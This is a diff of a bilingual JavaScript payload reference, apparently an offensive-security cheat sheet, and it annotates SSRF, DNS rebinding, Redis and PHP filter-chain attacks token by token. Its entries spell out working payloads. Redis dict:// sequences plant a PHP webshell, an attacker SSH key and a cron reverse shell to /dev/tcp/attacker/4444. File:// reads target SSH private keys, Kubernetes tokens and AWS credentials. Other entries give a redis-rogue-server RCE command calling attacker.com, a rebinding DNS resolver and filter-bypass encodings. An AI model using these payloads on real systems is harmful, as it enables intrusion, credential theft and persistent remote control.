+              { part: '%252a%250d%250a', explanation: { zh: '双重编码的*与CRLF(%25→%)*', en: 'Double-encoded asterisk and CRLF' }, type: 'encoding' },
+              { part: '双重编码绕过', explanation: { zh: '绕过对gopher载荷的一次性解码过滤', en: 'Bypass single-decode filtering' }, type: 'technique' },
             ],
         description: { zh: '双重URL编码绕过', en: 'DoubleURL EncodingBypass' }, 
         platform: 'all'
@@ -6409,7 +6437,9 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '2. 探测Redis', en: '2. DetectRedis' }, 
         command: 'dict://127.0.0.1:6379/info\ndict://127.0.0.1:6379/keys%20*\n获取Redis信息',
             syntaxBreakdown: [
-              { part: 'dict://127.0.0.1:6379/info\ndict://127.0.0.1:6379/keys%20*\n获取Redis信息', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: 'dict://127.0.0.1:6379', explanation: { zh: 'dict协议直连内网Redis', en: 'Dict protocol to internal Redis' }, type: 'domain' },
+              { part: '/info', explanation: { zh: 'Redis INFO命令：获取服务器版本与配置信息', en: 'Redis INFO command' }, type: 'command' },
+              { part: '/keys%20*', explanation: { zh: 'Redis KEYS *：列出全部键名', en: 'Redis KEYS * command' }, type: 'command' },
             ],
         description: { zh: '探测Redis服务', en: 'DetectRedisService' }, 
         platform: 'all'
@@ -6418,7 +6448,9 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '3. 探测Memcached', en: '3. DetectMemcached' }, 
         command: 'dict://127.0.0.1:11211/stats\ndict://127.0.0.1:11211/get%20key\n获取Memcached信息',
             syntaxBreakdown: [
-              { part: 'dict://127.0.0.1:11211/stats\ndict://127.0.0.1:11211/get%20key\n获取Memcached信息', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: 'dict://127.0.0.1:11211', explanation: { zh: 'dict协议直连内网Memcached', en: 'Dict protocol to internal Memcached' }, type: 'domain' },
+              { part: '/stats', explanation: { zh: 'Memcached STATS命令：获取统计信息', en: 'Memcached STATS command' }, type: 'command' },
+              { part: '/get%20key', explanation: { zh: 'GET命令读取指定缓存键的值', en: 'GET command to read cached key' }, type: 'command' },
             ],
         description: { zh: '探测Memcached服务', en: 'DetectMemcachedService' }, 
         platform: 'all'
@@ -6427,8 +6459,10 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '4. Redis写入文件', en: '4. RedisWriteFile' }, 
         command: 'dict://127.0.0.1:6379/set%20shell%20"<?php @eval($_POST[cmd]);?>"\ndict://127.0.0.1:6379/config%20set%20dir%20/var/www/html\ndict://127.0.0.1:6379/config%20set%20dbfilename%20shell.php\ndict://127.0.0.1:6379/save',
             syntaxBreakdown: [
-              { part: 'dict://127.0.0.1:6379/set%20shell%20"<?php', explanation: { zh: '命令/载荷起始', en: 'Command/PayloadStart' }, type: 'command' },
-              { part: ' @eval($_POST[cmd]);?>"\ndict://127.0.0.1:6379/config%20set%20dir%20/var/www/html\ndict://127.0.0.1:6379/config%20set%20dbfilename%20shell.php\ndict://127.0.0.1:6379/save', explanation: { zh: '参数与载荷内容', en: 'Parameter and PayloadContent' }, type: 'value' }
+              { part: 'set%20shell%20"<?php @eval($_POST[cmd]);?>"', explanation: { zh: '向键shell写入PHP一句话木马', en: 'Write PHP webshell into Redis key' }, type: 'value' },
+              { part: 'config%20set%20dir%20/var/www/html', explanation: { zh: '设置RDB落盘目录为web根目录', en: 'Set RDB directory to web root' }, type: 'command' },
+              { part: 'config%20set%20dbfilename%20shell.php', explanation: { zh: 'RDB文件名改为shell.php', en: 'Set RDB filename to shell.php' }, type: 'command' },
+              { part: '/save', explanation: { zh: '触发落盘在web目录生成webshell', en: 'Trigger RDB save to drop webshell' }, type: 'command' },
             ],
         description: { zh: '写入WebShell', en: 'WriteWebShell' }, 
         },
@@ -6438,7 +6472,8 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '编码绕过', en: 'Encoding Bypass' }, 
         command: 'dict://127.0.0.1:6379/%73%65%74%20...\nURL编码命令',
             syntaxBreakdown: [
-              { part: 'dict://127.0.0.1:6379/%73%65%74%20...\nURL编码命令', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: '%73%65%74%20', explanation: { zh: 'set命令的URL编码形式(%73=s %65=e %74=t)', en: 'URL-encoded SET command' }, type: 'encoding' },
+              { part: 'URL编码命令', explanation: { zh: '对dict命令整体编码绕过关键字过滤', en: 'Encode commands to bypass filtering' }, type: 'technique' },
             ],
         description: { zh: 'URL编码绕过关键字过滤', en: 'URL EncodingBypassCriticalCharacterFilter' }, 
         platform: 'all'
@@ -6476,7 +6511,10 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '2. Windows敏感文件', en: '2. WindowsSensitive Files' }, 
         command: 'file:///c:/windows/win.ini\nfile:///c:/windows/system32/config/sam\nfile:///c:/users/administrator/.ssh/id_rsa\nfile:///c:/inetpub/logs/logfiles/',
             syntaxBreakdown: [
-              { part: 'file:///c:/windows/win.ini\nfile:///c:/windows/system32/config/sam\nfile:///c:/u', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: 'file:///c:/windows/win.ini', explanation: { zh: '读取Windows系统配置文件验证file协议可用', en: 'Read win.ini to verify file wrapper' }, type: 'path' },
+              { part: 'file:///c:/windows/system32/config/sam', explanation: { zh: 'SAM账户数据库(运行中通常被锁定)', en: 'SAM database (usually locked)' }, type: 'path' },
+              { part: 'file:///c:/users/administrator/.ssh/id_rsa', explanation: { zh: '管理员SSH私钥', en: 'Administrator SSH private key' }, type: 'path' },
+              { part: 'file:///c:/inetpub/logs/logfiles/', explanation: { zh: 'IIS日志目录', en: 'IIS log directory' }, type: 'path' },
             ],
         description: { zh: '读取Windows敏感文件', en: 'ReadWindowsSensitive Files' }, 
         platform: 'windows'
@@ -6485,7 +6523,10 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '3. Web配置文件', en: '3. WebConfiguration File' }, 
         command: 'file:///var/www/html/config.php\nfile:///var/www/html/wp-config.php\nfile:///app/config/database.yml\nfile:///app/.env',
             syntaxBreakdown: [
-              { part: 'file:///var/www/html/config.php\nfile:///var/www/html/wp-config.php\nfile:///app', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: 'file:///var/www/html/config.php', explanation: { zh: '通用PHP应用配置文件', en: 'Generic PHP app config' }, type: 'path' },
+              { part: 'file:///var/www/html/wp-config.php', explanation: { zh: 'WordPress配置：含数据库凭据', en: 'WordPress config with DB credentials' }, type: 'path' },
+              { part: 'file:///app/config/database.yml', explanation: { zh: 'Rails数据库配置文件', en: 'Rails database config' }, type: 'path' },
+              { part: 'file:///app/.env', explanation: { zh: '环境变量文件：常含密钥与凭据', en: 'Env file with secrets' }, type: 'path' },
             ],
         description: { zh: '读取Web应用配置', en: 'ReadWebApplicationConfiguration' }, 
         platform: 'all'
@@ -6494,7 +6535,9 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '4. 云环境文件', en: '4. Cloud environment files' }, 
         command: 'file:///var/run/secrets/kubernetes.io/serviceaccount/token\nfile:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt\nfile:///home/user/.aws/credentials',
             syntaxBreakdown: [
-              { part: 'file:///var/run/secrets/kubernetes.io/serviceaccount/token\nfile:///var/run/secr', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: 'file:///var/run/secrets/kubernetes.io/serviceaccount/token', explanation: { zh: 'K8s服务账号JWT令牌', en: 'Kubernetes service account token' }, type: 'path' },
+              { part: 'file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt', explanation: { zh: 'K8s集群CA证书', en: 'Kubernetes cluster CA cert' }, type: 'path' },
+              { part: 'file:///home/user/.aws/credentials', explanation: { zh: 'AWS CLI凭据文件', en: 'AWS credentials file' }, type: 'path' },
             ],
         description: { zh: '读取云环境凭据', en: 'Read cloud environment credentials' }, 
         platform: 'all'
@@ -6503,7 +6546,9 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '5. SSH密钥', en: '5. SSHkey' }, 
         command: 'file:///home/user/.ssh/id_rsa\nfile:///home/user/.ssh/authorized_keys\nfile:///root/.ssh/id_rsa',
             syntaxBreakdown: [
-              { part: 'file:///home/user/.ssh/id_rsa\nfile:///home/user/.ssh/authorized_keys\nfile:///r', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: 'file:///home/user/.ssh/id_rsa', explanation: { zh: '普通用户SSH私钥', en: 'User SSH private key' }, type: 'path' },
+              { part: 'file:///home/user/.ssh/authorized_keys', explanation: { zh: '公钥文件：可读则掌握可登录账户', en: 'authorized_keys reveals valid accounts' }, type: 'path' },
+              { part: 'file:///root/.ssh/id_rsa', explanation: { zh: 'root账户私钥', en: 'Root SSH private key' }, type: 'path' },
             ],
         description: { zh: '读取SSH私钥', en: 'ReadSSHprivate key' }, 
         },
@@ -6513,7 +6558,10 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '大小写混合', en: 'Mixed case' }, 
         command: 'FILE:///etc/passwd\nFile:///etc/passwd\nfile:///ETC/PASSWD',
             syntaxBreakdown: [
-              { part: 'FILE:///etc/passwd\nFile:///etc/passwd\nfile:///ETC/PASSWD', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: 'FILE:///', explanation: { zh: 'file协议全大写形式', en: 'Uppercase file scheme' }, type: 'encoding' },
+              { part: 'File:///', explanation: { zh: 'file协议首字母大写形式', en: 'Capitalized file scheme' }, type: 'encoding' },
+              { part: 'file:///ETC/PASSWD', explanation: { zh: '路径部分大写的变体', en: 'Uppercase path variant' }, type: 'encoding' },
+              { part: '/etc/passwd', explanation: { zh: '目标：Linux用户账户文件', en: 'Target: Linux passwd file' }, type: 'path' },
             ],
         description: { zh: '大小写混合绕过', en: 'Mixed-case bypass' }, 
         platform: 'all'
@@ -6561,7 +6609,9 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '3. 重定向绕过', en: '3. RedirectBypass' }, 
         command: 'http://attacker.com/redirect?url=http://127.0.0.1\n使用短链接服务重定向到内网',
             syntaxBreakdown: [
-              { part: 'http://attacker.com/redirect?url=http://127.0.0.1\n使用短链接服务重定向到内网', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: 'attacker.com/redirect?url=', explanation: { zh: '攻击者服务器上的302跳转接口', en: 'Attacker redirect endpoint' }, type: 'domain' },
+              { part: 'http://127.0.0.1', explanation: { zh: '跳转目标为内网回环地址', en: 'Redirect target is loopback address' }, type: 'domain' },
+              { part: '使用短链接服务重定向到内网', explanation: { zh: '短链接服务同理可用于中转', en: 'Short links work the same way' }, type: 'technique' },
             ],
         description: { zh: '利用HTTP重定向', en: 'ExploitationHTTPRedirect' }, 
         platform: 'all'
@@ -6570,7 +6620,9 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '4. DNS重绑定', en: '4. DNS Rebinding' }, 
         command: 'http://7f000001.cip.cc\nhttp://127.0.0.1.nip.io\n第一次解析为外网IP，第二次解析为内网IP',
             syntaxBreakdown: [
-              { part: 'http://7f000001.cip.cc\nhttp://127.0.0.1.nip.io\n第一次解析为外网IP，第二次解析为内网IP', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: '7f000001.cip.cc', explanation: { zh: '十六进制IP编码域名，解析结果即127.0.0.1', en: 'Hex IP domain resolving to 127.0.0.1' }, type: 'domain' },
+              { part: '127.0.0.1.nip.io', explanation: { zh: 'nip.io泛解析服务：把IP写进子域名', en: 'nip.io wildcard DNS' }, type: 'domain' },
+              { part: '第一次解析为外网IP，第二次解析为内网IP', explanation: { zh: '重绑定原理：交替返回内外网IP绕过校验', en: 'Alternating IPs bypass validation' }, type: 'technique' },
             ],
         description: { zh: 'DNS重绑定攻击', en: 'DNS Rebinding Attack' }, 
         platform: 'all'
@@ -6579,7 +6631,10 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '5. IPv6绕过', en: '5. IPv6Bypass' }, 
         command: 'http://[::1]\nhttp://[0:0:0:0:0:0:0:1]\nhttp://[0000::1]\n使用IPv6本地地址',
             syntaxBreakdown: [
-              { part: 'http://[::1]\nhttp://[0:0:0:0:0:0:0:1]\nhttp://[0000::1]\n使用IPv6本地地址', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: '[::1]', explanation: { zh: 'IPv6回环地址简写形式', en: 'IPv6 loopback shorthand' }, type: 'domain' },
+              { part: '[0:0:0:0:0:0:0:1]', explanation: { zh: 'IPv6回环地址完整形式', en: 'Full-form IPv6 loopback' }, type: 'domain' },
+              { part: '[0000::1]', explanation: { zh: 'IPv6回环地址零压缩变体', en: 'Zero-padded IPv6 loopback' }, type: 'domain' },
+              { part: '使用IPv6本地地址', explanation: { zh: '绕过仅过滤IPv4内网段的黑名单', en: 'Bypass IPv4-only blacklist' }, type: 'technique' },
             ],
         description: { zh: '使用IPv6地址绕过', en: 'UseIPv6AddressBypass' }, 
         platform: 'all'
@@ -6588,8 +6643,9 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '6. 编码绕过', en: '6. Encoding Bypass' }, 
         command: 'http://%31%32%37%2e%30%2e%30%2e%31 (URL编码)\nhttp://127.0.0.1%00attacker.com (空字节)\nhttp://127.0.0.1%0d%0aHost:attacker.com (CRLF)',
             syntaxBreakdown: [
-              { part: 'http://%31%32%37%2e%30%2e%30%2e%31', explanation: { zh: '命令/载荷起始', en: 'Command/PayloadStart' }, type: 'command' },
-              { part: ' (URL编码)\nhttp://127.0.0.1%00attacker.com (空字节)\nhttp://127.0.0.1%0d%0aHost:attacker.com (CRLF)', explanation: { zh: '参数与载荷内容', en: 'Parameter and PayloadContent' }, type: 'value' }
+              { part: '%31%32%37%2e%30%2e%30%2e%31', explanation: { zh: '127.0.0.1的百分号全编码形式', en: 'Percent-encoded 127.0.0.1' }, type: 'encoding' },
+              { part: '%00', explanation: { zh: '空字节截断后缀，截断后续域名校验', en: 'Null byte truncates suffix' }, type: 'encoding' },
+              { part: '%0d%0aHost:attacker.com', explanation: { zh: 'CRLF注入伪造Host头', en: 'CRLF injecting fake Host header' }, type: 'encoding' },
             ],
         description: { zh: '使用编码绕过', en: 'UseEncoding Bypass' }, 
         },
@@ -6599,7 +6655,10 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '组合绕过', en: 'GroupsCombineBypass' }, 
         command: 'http://0x7f.0.0.1\nhttp://0177.0.0.1\nhttp://127.000.000.001\n多种格式组合',
             syntaxBreakdown: [
-              { part: 'http://0x7f.0.0.1\nhttp://0177.0.0.1\nhttp://127.000.000.001\n多种格式组合', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: '0x7f.0.0.1', explanation: { zh: '十六进制IP表示(0x7f=127)', en: 'Hexadecimal IP notation' }, type: 'domain' },
+              { part: '0177.0.0.1', explanation: { zh: '八进制IP表示(0177=127)', en: 'Octal IP notation' }, type: 'domain' },
+              { part: '127.000.000.001', explanation: { zh: '零填充十进制IP表示', en: 'Zero-padded decimal IP' }, type: 'domain' },
+              { part: '多种格式组合', explanation: { zh: '组合多种非标准写法绕过黑名单', en: 'Combine notations to bypass blacklist' }, type: 'technique' },
             ],
         description: { zh: '组合多种绕过技术', en: 'GroupsCombineMultipleBypass Techniques' }, 
         platform: 'all'
@@ -6637,8 +6696,10 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '2. 使用公开服务', en: '2. UsepublicService' }, 
         command: 'http://7f000001.cip.cc (解析为127.0.0.1)\nhttp://127.0.0.1.nip.io\nhttp://127.0.0.1.xip.io\nhttp://A.127.0.0.1.1time.8.8.8.8.forever.rebind.network',
             syntaxBreakdown: [
-              { part: 'http://7f000001.cip.cc', explanation: { zh: '命令/载荷起始', en: 'Command/PayloadStart' }, type: 'command' },
-              { part: ' (解析为127.0.0.1)\nhttp://127.0.0.1.nip.io\nhttp://127.0.0.1.xip.io\nhttp://A.127.0.0.1.1time.8.8.8.8.forever.rebind.network', explanation: { zh: '参数与载荷内容', en: 'Parameter and PayloadContent' }, type: 'value' }
+              { part: '7f000001.cip.cc', explanation: { zh: '十六进制IP编码重绑定域名', en: 'Hex IP rebinding domain' }, type: 'domain' },
+              { part: '127.0.0.1.nip.io', explanation: { zh: 'nip.io泛解析服务', en: 'nip.io wildcard DNS' }, type: 'domain' },
+              { part: '127.0.0.1.xip.io', explanation: { zh: 'xip.io泛解析服务(同类)', en: 'xip.io wildcard DNS' }, type: 'domain' },
+              { part: 'forever.rebind.network', explanation: { zh: '专用重绑定服务：按TTL交替返回内外网IP', en: 'Dedicated rebinding service' }, type: 'domain' },
             ],
         description: { zh: '使用DNS重绑定服务', en: 'UseDNS RebindingService' }, 
         platform: 'all'
@@ -6647,7 +6708,11 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '3. 自建DNS服务器', en: '3. 自建DNSServer' }, 
         command: '# 使用dnspython搭建\nfrom dnslib import *\nclass RebindResolver:\n    def __init__(self):\n        self.count = 0\n    def resolve(self, request):\n        self.count += 1\n        if self.count % 2 == 1:\n            return "1.2.3.4"  # 外网IP\n        else:\n            return "127.0.0.1"  # 内网IP',
             syntaxBreakdown: [
-              { part: '# 使用dnspython搭建\nfrom dnslib import *\nclass RebindResolver:\n    def __init__(s', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: 'from dnslib import *', explanation: { zh: '导入DNS报文构造库', en: 'Import DNS library' }, type: 'command' },
+              { part: 'class RebindResolver:', explanation: { zh: '自定义重绑定解析器类', en: 'Custom rebinding resolver class' }, type: 'keyword' },
+              { part: 'self.count % 2 == 1', explanation: { zh: '按请求次数奇偶交替返回不同IP', en: 'Alternate IPs by query parity' }, type: 'value' },
+              { part: 'return "1.2.3.4"', explanation: { zh: '首次解析返回外网IP通过白名单校验', en: 'First answer passes validation' }, type: 'value' },
+              { part: 'return "127.0.0.1"', explanation: { zh: '第二次返回内网IP命中SSRF目标', en: 'Second answer hits internal target' }, type: 'value' },
             ],
         description: { zh: '自建DNS重绑定服务器', en: 'Set up custom DNS rebinding server' }, 
         platform: 'all'
@@ -6656,8 +6721,10 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '4. 攻击流程', en: '4. Attackworkflow' }, 
         command: '1. 注册域名指向自建DNS服务器\n2. 配置DNS服务器返回两个IP\n3. 使用该域名发起SSRF请求\n4. 第一次验证通过，第二次访问内网',
             syntaxBreakdown: [
-              { part: '1.', explanation: { zh: '命令/载荷起始', en: 'Command/PayloadStart' }, type: 'command' },
-              { part: ' 注册域名指向自建DNS服务器\n2. 配置DNS服务器返回两个IP\n3. 使用该域名发起SSRF请求\n4. 第一次验证通过，第二次访问内网', explanation: { zh: '参数与载荷内容', en: 'Parameter and PayloadContent' }, type: 'value' }
+              { part: '1. 注册域名指向自建DNS服务器', explanation: { zh: '准备可控的权威DNS', en: 'Register domain with self-controlled DNS' }, type: 'concept' },
+              { part: '2. 配置DNS服务器返回两个IP', explanation: { zh: '交替返回外网与内网IP', en: 'Return two different IPs' }, type: 'concept' },
+              { part: '3. 使用该域名发起SSRF请求', explanation: { zh: '诱使目标服务请求重绑定域名', en: 'Trigger SSRF via the domain' }, type: 'concept' },
+              { part: '4. 第一次验证通过，第二次访问内网', explanation: { zh: '首次通过校验、二次直达内网', en: 'First passes check, second hits intranet' }, type: 'concept' },
             ],
         description: { zh: '完整攻击流程', en: 'completeAttackworkflow' }, 
         },
@@ -6667,7 +6734,8 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '多IP响应', en: 'MultipleIPResponse' }, 
         command: 'DNS响应包含多个A记录\n服务器可能选择不同的IP',
             syntaxBreakdown: [
-              { part: 'DNS响应包含多个A记录\n服务器可能选择不同的IP', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: 'DNS响应包含多个A记录', explanation: { zh: '一次解析返回多条A记录', en: 'Multiple A records in one response' }, type: 'concept' },
+              { part: '服务器可能选择不同的IP', explanation: { zh: '应用多次解析可能选中不同记录', en: 'Apps may pick different records' }, type: 'concept' },
             ],
         description: { zh: '利用多IP响应', en: 'ExploitationMultipleIPResponse' }, 
         platform: 'all'
@@ -6694,7 +6762,8 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '1. 探测Redis', en: '1. DetectRedis' }, 
         command: 'dict://127.0.0.1:6379/info\n或使用Gopher:\ngopher://127.0.0.1:6379/_INFO',
             syntaxBreakdown: [
-              { part: 'dict://127.0.0.1:6379/info\n或使用Gopher:\ngopher://127.0.0.1:6379/_INFO', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: 'dict://127.0.0.1:6379/info', explanation: { zh: 'dict协议发送Redis INFO命令', en: 'Dict sends Redis INFO' }, type: 'command' },
+              { part: 'gopher://127.0.0.1:6379/_INFO', explanation: { zh: 'gopher协议发送INFO的等价形式', en: 'Gopher equivalent of INFO' }, type: 'command' },
             ],
         description: { zh: '探测Redis服务', en: 'DetectRedisService' }, 
         platform: 'all'
@@ -6715,8 +6784,10 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '3. 写入SSH公钥', en: '3. WriteSSHpublic key' }, 
         command: 'dict://127.0.0.1:6379/set%20ssh%20"ssh-rsa AAAA..."\ndict://127.0.0.1:6379/config%20set%20dir%20/root/.ssh\ndict://127.0.0.1:6379/config%20set%20dbfilename%20authorized_keys\ndict://127.0.0.1:6379/save',
             syntaxBreakdown: [
-              { part: 'dict://127.0.0.1:6379/set%20ssh%20"ssh-rsa', explanation: { zh: '命令/载荷起始', en: 'Command/PayloadStart' }, type: 'command' },
-              { part: ' AAAA..."\ndict://127.0.0.1:6379/config%20set%20dir%20/root/.ssh\ndict://127.0.0.1:6379/config%20set%20dbfilename%20authorized_keys\ndict://127.0.0.1:6379/save', explanation: { zh: '参数与载荷内容', en: 'Parameter and PayloadContent' }, type: 'value' }
+              { part: 'set%20ssh%20"ssh-rsa AAAA..."', explanation: { zh: '向键ssh写入攻击者SSH公钥', en: 'Write attacker SSH public key' }, type: 'value' },
+              { part: 'config%20set%20dir%20/root/.ssh', explanation: { zh: '设置落盘目录为root的ssh目录', en: 'Set dump directory to /root/.ssh' }, type: 'command' },
+              { part: 'config%20set%20dbfilename%20authorized_keys', explanation: { zh: '文件名改为authorized_keys', en: 'Filename set to authorized_keys' }, type: 'command' },
+              { part: '/save', explanation: { zh: '触发落盘后即可免密登录root', en: 'Persist key for passwordless root login' }, type: 'command' },
             ],
         description: { zh: '写入SSH公钥', en: 'WriteSSHpublic key' }, 
         platform: 'all'
@@ -6725,7 +6796,10 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '4. 写入Cron任务', en: '4. WriteCron Jobs' }, 
         command: 'dict://127.0.0.1:6379/set%20cron%20"*/1 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1"\ndict://127.0.0.1:6379/config%20set%20dir%20/var/spool/cron\ndict://127.0.0.1:6379/config%20set%20dbfilename%20root\ndict://127.0.0.1:6379/save',
             syntaxBreakdown: [
-              { part: 'dict://127.0.0.1:6379/set%20cron%20"*/1 * * * * bash -i >& /dev/tcp/attacker/444', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: 'set%20cron%20"*/1 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1"', explanation: { zh: '写入每分钟执行一次的反弹shell定时任务', en: 'Per-minute reverse shell crontab' }, type: 'value' },
+              { part: 'config%20set%20dir%20/var/spool/cron', explanation: { zh: '设置落盘目录为cron目录', en: 'Set dump directory to cron path' }, type: 'command' },
+              { part: 'config%20set%20dbfilename%20root', explanation: { zh: '文件名设为root用户的crontab', en: 'Filename set to root crontab' }, type: 'command' },
+              { part: '/save', explanation: { zh: '触发落盘使定时任务生效', en: 'Persist crontab' }, type: 'command' },
             ],
         description: { zh: '写入Cron反弹Shell', en: 'WriteCronReverse Shell' }, 
         platform: 'linux'
@@ -6734,8 +6808,10 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '5. 主从复制RCE', en: '5. Master-slave replication RCE' }, 
         command: '# 使用redis-rogue-server\npython redis-rogue-server.py --rhost=127.0.0.1 --lhost=attacker.com\n利用Redis主从复制加载恶意模块',
             syntaxBreakdown: [
-              { part: '#', explanation: { zh: '命令/载荷起始', en: 'Command/PayloadStart' }, type: 'command' },
-              { part: ' 使用redis-rogue-server\npython redis-rogue-server.py --rhost=127.0.0.1 --lhost=attacker.com\n利用Redis主从复制加载恶意模块', explanation: { zh: '参数与载荷内容', en: 'Parameter and PayloadContent' }, type: 'value' }
+              { part: 'python redis-rogue-server.py', explanation: { zh: '运行redis-rogue-server主从复制攻击工具', en: 'Run redis-rogue-server tool' }, type: 'command' },
+              { part: '--rhost=127.0.0.1', explanation: { zh: '指定受害Redis为本地回环', en: 'Victim Redis host' }, type: 'parameter' },
+              { part: '--lhost=attacker.com', explanation: { zh: '指定攻击者(恶意主节点)地址', en: 'Attacker master host' }, type: 'parameter' },
+              { part: '利用Redis主从复制加载恶意模块', explanation: { zh: '主从复制推送恶意so模块实现RCE', en: 'Master-slave replication delivers module' }, type: 'technique' },
             ],
         description: { zh: '主从复制RCE', en: 'Master-slave replication RCE' }, 
         },
@@ -6745,7 +6821,8 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: 'Gopher协议构造', en: 'GopherProtocolConstruct' }, 
         command: '使用Gopher协议构造完整的Redis命令序列\n可以绕过Dict协议限制',
             syntaxBreakdown: [
-              { part: '使用Gopher协议构造完整的Redis命令序列\n可以绕过Dict协议限制', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: '使用Gopher协议构造完整的Redis命令序列', explanation: { zh: 'gopher可携带完整多命令请求流', en: 'Gopher carries full command stream' }, type: 'technique' },
+              { part: '可以绕过Dict协议限制', explanation: { zh: 'dict仅支持单条命令，gopher无此限制', en: 'No single-command limit unlike dict' }, type: 'technique' },
             ],
         description: { zh: '使用Gopher协议', en: 'UseGopherProtocol' }, 
         platform: 'all'
@@ -6932,7 +7009,9 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '1. Filter链原理', en: '1. FilterChainPrinciple' }, 
         command: '利用php://filter的convert.base64-decode等过滤器\n通过精心构造的输入，最终生成可执行代码',
             syntaxBreakdown: [
-              { part: '利用php://filter的convert.base64-decode等过滤器\n通过精心构造的输入，最终生成可执行代码', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: 'convert.base64-decode', explanation: { zh: 'filter链中的Base64解码过滤器', en: 'Base64 decode filter in chain' }, type: 'parameter' },
+              { part: 'php://filter', explanation: { zh: 'PHP流过滤器协议，链式转换数据', en: 'PHP stream filter wrapper' }, type: 'parameter' },
+              { part: '通过精心构造的输入，最终生成可执行代码', explanation: { zh: '输入经链式转换后首字节变为<?php等可执行前缀', en: 'Chained transforms yield executable PHP' }, type: 'technique' },
             ],
         description: { zh: 'Filter链原理', en: 'FilterChainPrinciple' }, 
         platform: 'all'
@@ -6952,8 +7031,9 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '3. 使用工具生成', en: '3. UseToolsGenerate' }, 
         command: '# 使用php_filter_chain_generator\npython3 php_filter_chain_generator.py --chain "<?php system($_GET[cmd]);?>"\n\n# 输出可直接使用的Filter链',
             syntaxBreakdown: [
-              { part: '#', explanation: { zh: '命令/载荷起始', en: 'Command/PayloadStart' }, type: 'command' },
-              { part: ' 使用php_filter_chain_generator\npython3 php_filter_chain_generator.py --chain "<?php system($_GET[cmd]);?>"\n\n# 输出可直接使用的Filter链', explanation: { zh: '参数与载荷内容', en: 'Parameter and PayloadContent' }, type: 'value' }
+              { part: 'python3 php_filter_chain_generator.py', explanation: { zh: '运行filter链自动生成器', en: 'Run filter chain generator' }, type: 'command' },
+              { part: '--chain "<?php system($_GET[cmd]);?>"', explanation: { zh: '指定链条最终生成的PHP代码', en: 'Target PHP code for the chain' }, type: 'parameter' },
+              { part: '输出可直接使用的Filter链', explanation: { zh: '生成的过滤器链可直接放入file参数', en: 'Outputs ready-to-use filter chain' }, type: 'concept' },
             ],
         description: { zh: '使用工具生成Filter链', en: 'UseToolsGenerateFilterChain' }, 
         platform: 'all'
@@ -6962,7 +7042,10 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '4. 完整利用示例', en: '4. completeExploitationexample' }, 
